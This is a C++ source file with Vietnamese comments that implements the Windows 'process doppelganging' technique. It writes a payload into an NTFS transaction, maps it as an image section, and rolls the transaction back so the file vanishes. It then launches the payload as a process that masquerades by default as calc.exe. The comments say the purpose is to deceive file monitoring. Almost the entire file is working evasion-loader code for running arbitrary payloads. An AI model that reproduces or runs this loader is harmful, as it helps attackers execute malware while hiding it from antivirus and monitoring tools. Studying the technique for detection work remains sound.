#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "win_kernel_defs.h"
#include "win_api_ext.h"
#include "file_helper.h"

#include "binary_parser.h"
#include "proc_context.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

#define PAGE_SIZE 0x1000

// Tạo một phần giao dịch (transacted section) để lừa hệ thống theo dõi tệp
HANDLE create_transacted_section(wchar_t *target_path, BYTE *payload_data, DWORD payload_size)
{
    // Thiết lập các tùy chọn giao dịch
    DWORD options, isolation_level, isolation_flags, timeout;
    options = isolation_level = isolation_flags = timeout = 0;

    // Tạo giao dịch
    HANDLE transaction_handle = CreateTransaction(nullptr, nullptr, options, isolation_level, isolation_flags, timeout, nullptr);
    if (transaction_handle == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    // Chuẩn bị tạo tệp tạm thời trong giao dịch
    wchar_t temp_filename[MAX_PATH] = {0};
    wchar_t temp_dir_path[MAX_PATH] = {0};
    DWORD path_size = GetTempPathW(MAX_PATH, temp_dir_path);

    // Tạo tên tệp tạm thời
    GetTempFileNameW(temp_dir_path, L"TH", 0, temp_filename);

    // Tạo tệp trong giao dịch
    HANDLE transaction_file = CreateFileTransactedW(temp_filename,
                                                    GENERIC_WRITE | GENERIC_READ,
                                                    0,
                                                    NULL,
                                                    CREATE_ALWAYS,
                                                    FILE_ATTRIBUTE_NORMAL,
                                                    NULL,
                                                    transaction_handle,
                                                    NULL,
                                                    NULL);
    if (transaction_file == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    // Ghi dữ liệu payload vào tệp
    DWORD bytes_written = 0;
    if (!WriteFile(transaction_file, payload_data, payload_size, &bytes_written, NULL))
    {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    // Tạo phần (section) từ tệp
    HANDLE section_handle = nullptr;
    NTSTATUS status = NtCreateSection(&section_handle,
                                      SECTION_ALL_ACCESS,
                                      NULL,
                                      0,
                                      PAGE_READONLY,
                                      SEC_IMAGE,
                                      transaction_file);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    // Đóng file handle vì đã không cần thiết
    CloseHandle(transaction_file);
    transaction_file = nullptr;

    // Hoàn tác giao dịch để xóa tệp tạm thời nhưng vẫn giữ section
    if (RollbackTransaction(transaction_handle) == FALSE)
    {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(transaction_handle);
    transaction_handle = nullptr;

    return section_handle;
}

// Thực hiện kỹ thuật process doppelganging
bool execute_doppelganging(wchar_t *target_path, BYTE *payload_data, DWORD payload_size)
{
    // Tạo phần giao dịch
    HANDLE section_handle = create_transacted_section(target_path, payload_data, payload_size);
    if (!section_handle || section_handle == INVALID_HANDLE_VALUE)
    {
        return false;
    }

    // Tạo tiến trình mới từ phần đã tạo
    HANDLE process_handle = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &process_handle,    // ProcessHandle
        PROCESS_ALL_ACCESS, // DesiredAccess
        NULL,               // ObjectAttributes
        NtCurrentProcess(), // ParentProcess
        PS_INHERIT_HANDLES, // Flags
        section_handle,     // sectionHandle
        NULL,               // DebugPort
        NULL,               // ExceptionPort
        FALSE               // InJob
    );
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH)
        {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    // Truy vấn thông tin cơ bản của tiến trình
    PROCESS_BASIC_INFORMATION process_info = {0};
    DWORD return_length = 0;
    status = NtQueryInformationProcess(
        process_handle,
        ProcessBasicInformation,
        &process_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        &return_length);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }

    // Đọc PEB từ tiến trình từ xa
    PEB peb_data = {0};
    if (!read_remote_peb(process_handle, process_info, peb_data))
    {
        return false;
    }

    // Lấy địa chỉ cơ sở hình ảnh
    ULONGLONG image_base = (ULONGLONG)peb_data.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)image_base << std::endl;
#endif

    // Lấy địa chỉ điểm vào của payload
    DWORD entry_point_rva = get_entry_point_offset(payload_data);
    ULONGLONG process_entry = entry_point_rva + image_base;

    // Thiết lập tham số tiến trình
    if (!configure_process_parameters(process_handle, process_info, target_path))
    {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }

    std::cout << "[+] Process created! Pid = " << std::dec << GetProcessId(process_handle) << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)process_entry << std::endl;
#endif

    // Tạo luồng chính để thực thi tiến trình
    HANDLE thread_handle = NULL;
    status = NtCreateThreadEx(&thread_handle,
                              THREAD_ALL_ACCESS,
                              NULL,
                              process_handle,
                              (LPTHREAD_START_ROUTINE)process_entry,
                              NULL,
                              FALSE,
                              0,
                              0,
                              0,
                              NULL);

    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is_32bit = false;
#else
    const bool is_32bit = true;
#endif
    if (argc < 2)
    {
        std::cout << "Process Doppelganging (";
        if (is_32bit)
            std::cout << "32bit";
        else
            std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload path> [*target path]\n"
                  << std::endl;
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }

    // Khởi tạo các API mở rộng
    if (init_windows_api_extensions() == false)
    {
        return -1;
    }

    // Chuẩn bị đường dẫn mặc định (calc.exe) nếu không có đường dẫn đích
    wchar_t default_target[MAX_PATH] = {0};
    get_calculator_path(default_target, MAX_PATH, is_32bit);
    wchar_t *target_path = default_target;
    if (argc >= 3)
    {
        target_path = argv[2];
    }

    // Đường dẫn đến payload
    wchar_t *payload_path = argv[1];
    size_t payload_size = 0;

    // Đọc payload vào bộ nhớ
    BYTE *payload_data = load_file_to_memory(payload_path, payload_size);
    if (payload_data == NULL)
    {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    // Thực hiện kỹ thuật process doppelganging
    bool is_ok = execute_doppelganging(target_path, payload_data, (DWORD)payload_size);

    // Giải phóng bộ nhớ payload
    release_memory(payload_data, payload_size);

    // Hiển thị kết quả
    if (is_ok)
    {
        std::cerr << "[+] Done!" << std::endl;
    }
    else
    {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
